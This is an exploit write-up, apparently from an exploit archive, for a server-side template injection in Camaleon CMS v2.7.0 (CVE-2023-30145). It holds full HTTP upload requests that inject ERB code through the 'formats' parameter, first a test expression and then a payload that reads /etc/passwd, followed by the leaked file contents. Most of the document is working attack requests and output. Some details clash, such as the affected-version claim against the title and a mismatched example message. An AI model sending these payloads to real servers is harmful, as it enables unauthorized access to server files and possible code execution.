@@ -1,0 +1,183 @@
+id: 38738
+date: 05/27/2023
+title: Camaleon CMS v2.7.0 - Server-Side Template Injection Vulnerability
+author: PARAG BAGUL
+cves: CVE-2023-30145
+
+Exploit Title: Camaleon CMS v2.7.0 - Server-Side Template Injection (SSTI)
+Exploit Author: PARAG BAGUL
+CVE: CVE-2023-30145
+
+## Description
+Camaleon CMS v2.7.0 was discovered to contain a Server-Side Template
+Injection (SSTI) vulnerability via the formats parameter.
+
+## Affected Component
+All versions below 2.7.0 are affected.
+
+## Author
+Parag Bagul
+
+## Steps to Reproduce
+1. Open the target URL: `https://target.com/admin/media/upload`
+2. Upload any file and intercept the request.
+3. In the `formats` parameter value, add the payload `test<%= 7*7 %>test`.
+4. Check the response. It should return the multiplication of 77 with the
+message "File format not allowed (dqopi49vuuvm)".
+
+##Detection:
+
+#Request:
+
+POST /admin/media/upload?actions=false HTTP/1.1
+Host: target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101
+Firefox/102.0
+Accept: /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://target.com/admin/profile/edit
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data;
+boundary=---------------------------327175120238370517612522354688
+Content-Length: 1200
+Origin: http://target.com
+DNT: 1
+Connection: close
+Cookie: cookie
+
+-----------------------------327175120238370517612522354688
+Content-Disposition: form-data; name="file_upload"; filename="test.txt"
+Content-Type: text/plain
+
+test
+
+-----------------------------327175120238370517612522354688
+Content-Disposition: form-data; name="versions"
+
+-----------------------------327175120238370517612522354688
+Content-Disposition: form-data; name="thumb_size"
+
+-----------------------------327175120238370517612522354688
+Content-Disposition: form-data; name="formats"
+
+test<%= 7*7 %>test
+-----------------------------327175120238370517612522354688
+Content-Disposition: form-data; name="media_formats"
+
+image
+-----------------------------327175120238370517612522354688
+Content-Disposition: form-data; name="dimension"
+
+-----------------------------327175120238370517612522354688
+Content-Disposition: form-data; name="private"
+
+-----------------------------327175120238370517612522354688
+Content-Disposition: form-data; name="folder"
+
+/
+-----------------------------327175120238370517612522354688
+Content-Disposition: form-data; name="skip_auto_crop"
+
+true
+-----------------------------327175120238370517612522354688--
+
+#Response:
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Connection: close
+Status: 200 OK
+Cache-Control: max-age=0, private, must-revalidate
+Set-Cookie: cookie
+Content-Length: 41
+
+File format not allowed (test49test)
+
+#Exploitation:
+
+To execute a command, add the following payload:
+testqopi<%= File.open('/etc/passwd').read %>fdtest
+
+Request:
+
+POST /admin/media/upload?actions=true HTTP/1.1
+Host: target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101
+Firefox/102.0
+Accept: /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://target.com/admin/media
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data;
+boundary=---------------------------104219633614133026962934729021
+Content-Length: 1237
+Origin: http://target.com
+DNT: 1
+Connection: close
+Cookie: cookie
+
+-----------------------------104219633614133026962934729021
+Content-Disposition: form-data; name="file_upload"; filename="test.txt"
+Content-Type: text/plain
+
+test
+
+-----------------------------104219633614133026962934729021
+Content-Disposition: form-data; name="versions"
+
+-----------------------------104219633614133026962934729021
+Content-Disposition: form-data; name="thumb_size"
+
+-----------------------------104219633614133026962934729021
+Content-Disposition: form-data; name="formats"
+
+dqopi<%= File.open('/etc/passwd').read %>fdfdsf
+-----------------------------104219633614133026962934729021
+Content-Disposition: form-data; name="media_formats"
+
+-----------------------------104219633614133026962934729021
+Content-Disposition: form-data; name="dimension"
+
+-----------------------------104219633614133026962934729021
+Content-Disposition: form-data; name="private"
+
+-----------------------------104219633614133026962934729021
+Content-Disposition: form-data; name="folder"
+
+/
+-----------------------------104219633614133026962934729021
+Content-Disposition: form-data; name="skip_auto_crop"
+
+true
+-----------------------------104219633614133026962934729021--
+
+Response:
+
+Response:
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Connection: close
+Status: 200 OK
+Set-Cookie: cookie
+Content-Length: 1816
+
+File format not allowed (dqopiroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+fdfdsf)
+
+#  0day.today [2023-06-08]  #
